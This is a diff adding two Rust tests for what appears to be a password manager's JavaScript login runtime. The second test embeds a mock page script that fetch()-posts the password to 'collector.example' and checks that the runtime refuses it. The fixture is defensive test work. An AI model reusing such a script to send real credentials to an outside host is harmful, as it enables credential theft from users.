@@ -1738,3 +1738,126 @@ async fn real_login_pages_are_read_correctly_or_refused_clearly() {
         }
     }
 }
+
+// ── The M9c prototype, end to end ─────────────────────────────────────────────
+
+/// A site with no form at all: the page's own script builds a JSON request and
+/// `fetch`es it. This is the category M9a refuses and the reason the runtime
+/// exists — the whole login, through `perform_login`, against a site that a
+/// form parser cannot touch.
+#[cfg(feature = "js-login")]
+#[tokio::test]
+async fn a_javascript_only_login_completes_through_the_runtime() {
+    use wiremock::matchers::{body_string_contains, header};
+
+    let server = MockServer::start().await;
+    Mock::given(method("GET"))
+        .and(path("/login"))
+        .respond_with(ResponseTemplate::new(200).set_body_string(
+            r#"<html><body>
+            <div id="app">
+              <input id="u" type="text"><input id="p" type="password">
+            </div>
+            <script>
+              function onLoginSubmit() {
+                fetch("/api/session", {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json", "X-Csrf": "js-tok-42" },
+                  body: JSON.stringify({
+                    identifier: document.getElementById("u").value,
+                    secret: document.getElementById("p").value
+                  })
+                });
+              }
+            </script></body></html>"#,
+        ))
+        .mount(&server)
+        .await;
+    Mock::given(method("POST"))
+        .and(path("/api/session"))
+        .and(header("X-Csrf", "js-tok-42"))
+        .and(body_string_contains("\"identifier\":\"ada\""))
+        .and(body_string_contains(PASSWORD))
+        .respond_with(
+            ResponseTemplate::new(200)
+                .append_header("set-cookie", "sid=js-session; Path=/; HttpOnly")
+                .set_body_string("<html><body>Welcome, Ada</body></html>"),
+        )
+        .mount(&server)
+        .await;
+
+    let dir = tempfile::tempdir().unwrap();
+    let state = test_state(dir.path());
+    let login_url = format!("{}/login", server.uri());
+    state.vault.write().add_item(login_item("i1", &login_url, false));
+
+    let outcome = perform_login(
+        &state,
+        &LoginRequest {
+            item_id: "i1".to_string(),
+            login_url: None,
+        },
+        grant_for(&server, "i1").await,
+    )
+    .await
+    .expect("a JS-only login should complete");
+
+    assert!(outcome.looks_authenticated);
+    assert!(outcome.cookies.iter().any(|c| c.name == "sid"));
+
+    // The mock only matched a body carrying the real password and the script's
+    // own CSRF header, so reaching here proves the substitution happened after
+    // the runtime exited and the script's headers were honoured. And the
+    // credential still has no field to travel back in.
+    let serialized = serde_json::to_string(&outcome).unwrap();
+    assert!(!serialized.contains(PASSWORD), "{serialized}");
+    assert!(
+        !serialized.contains(crate::js_login::PLACEHOLDER_PASSWORD),
+        "{serialized}"
+    );
+}
+
+/// A script that posts the credential to another host is refused, and nothing
+/// is sent. Same rule as the form path's cross-site redirect, applied to a
+/// request the page composed itself.
+#[cfg(feature = "js-login")]
+#[tokio::test]
+async fn a_script_that_posts_off_site_is_refused() {
+    let server = MockServer::start().await;
+    Mock::given(method("GET"))
+        .and(path("/login"))
+        .respond_with(ResponseTemplate::new(200).set_body_string(
+            r#"<html><body><input id="p" type="password">
+            <script>
+              function onLoginSubmit() {
+                fetch("https://collector.example/take", {
+                  method: "POST",
+                  body: JSON.stringify({ secret: document.getElementById("p").value })
+                });
+              }
+            </script></body></html>"#,
+        ))
+        .mount(&server)
+        .await;
+
+    let dir = tempfile::tempdir().unwrap();
+    let state = test_state(dir.path());
+    let login_url = format!("{}/login", server.uri());
+    state.vault.write().add_item(login_item("i1", &login_url, false));
+
+    let error = perform_login(
+        &state,
+        &LoginRequest {
+            item_id: "i1".to_string(),
+            login_url: None,
+        },
+        grant_for(&server, "i1").await,
+    )
+    .await
+    .unwrap_err();
+
+    assert_eq!(
+        error,
+        LoginError::CrossSiteRedirect("collector.example".to_string())
+    );
+}
